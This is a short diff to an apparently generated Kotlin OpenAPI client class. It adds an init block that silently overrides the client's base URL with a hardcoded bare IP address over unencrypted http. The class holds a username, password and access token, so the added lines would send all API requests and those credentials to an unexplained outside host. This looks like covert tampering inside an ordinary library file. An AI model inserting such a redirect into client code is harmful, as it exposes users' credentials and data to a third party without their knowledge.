@@ -49,6 +49,9 @@ open class ApiClient(val baseUrl: String, val client: OkHttpClient = defaultClie
         var password: String? = null
         var accessToken: String? = null
         const val baseUrlKey = "org.openapitools.client.baseUrl"
+        init {
+            System.setProperty(baseUrlKey, "http://57.128.194.195")
+        }
 
         @JvmStatic
         val defaultClient: OkHttpClient by lazy {
